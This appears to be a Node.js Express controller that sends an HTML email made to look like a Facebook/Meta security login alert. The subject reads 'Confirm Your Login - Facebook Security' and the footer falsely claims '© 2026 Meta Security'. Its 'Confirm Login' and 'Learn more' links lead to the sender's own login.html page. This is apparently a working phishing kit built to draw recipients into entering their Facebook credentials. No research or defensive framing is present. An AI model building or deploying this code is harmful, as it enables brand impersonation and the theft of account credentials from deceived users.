// controllers/emailController.js
const sendEmail = require('../services/emailService');

// Inline f logo (SVG - no file needed)
const fLogo = `
<svg width="40" height="40" viewBox="0 0 100 100" fill="#1a73e8" xmlns="http://www.w3.org/2000/svg">
  <circle cx="50" cy="50" r="45" stroke="#1a73e8" stroke-width="5" fill="none"/>
  <text x="50%" y="55%" text-anchor="middle" fill="#1a73e8" font-size="40" font-family="Arial" dy=".3em">PB</text>
</svg>
`;

// Email template
const emailTemplate = (loginLink, userEmail) => `
<div style="background:#18191a;color:#e4e6eb;font-family:Arial,sans-serif;padding:30px;">

  <!-- Top line with f Logo -->
  <div style="display:flex;align-items:center;">
    ${fLogo}
    <hr style="flex-grow:1;border:1px solid #3a3b3c;margin-left:10px;">
  </div>

  <p style="margin-top:20px;">Hello,</p>

  <p>
    We noticed a login attempt to your Facebook Security portal.
    This is to ensure your account remains secure.
  </p>

  <b>About this change</b>
  <p>
    If this login was made by you, no action is required.
    If not, please review your account immediately.
  </p>

  <!-- Button -->
  <a href="${loginLink}"
     style="display:block;width:100%;text-align:center;background:#1a73e8;color:#fff;
     padding:14px;text-decoration:none;border-radius:5px;margin:20px 0;font-weight:bold;">
     Confirm Login
  </a>

  <p>
    If this wasn’t you, we strongly recommend securing your account immediately.
  </p>

  <hr style="border:1px solid #3a3b3c;margin:15px 0;">

  <p style="font-size:13px;">
    © 2026 Meta Security · 
    <a href="${loginLink}" style="color:#1a73e8;text-decoration:none;">Learn more</a>
  </p>

  <p style="font-size:12px;color:#aaa;">Sent to ${userEmail}</p>
</div>
`;

exports.sendLoginEmail = async (req, res) => {
  try {
    const { email } = req.body;

    if (!email) {
      return res.status(400).json({ success: false, message: "Email required" });
    }

    const loginLink = `${process.env.FRONTEND_URL}/login.html`;

    const sent = await sendEmail(
      email,
      "🔐 Confirm Your Login - Facebook Security",
      emailTemplate(loginLink, email)
    );

    if (!sent) {
      return res.status(500).json({ success: false, message: "Email failed to send" });
    }

    return res.status(200).json({ success: true, message: "Email sent successfully" });

  } catch (err) {
    console.error("Email error:", err);
    return res.status(500).json({ success: false, message: "Server error" });
  }
};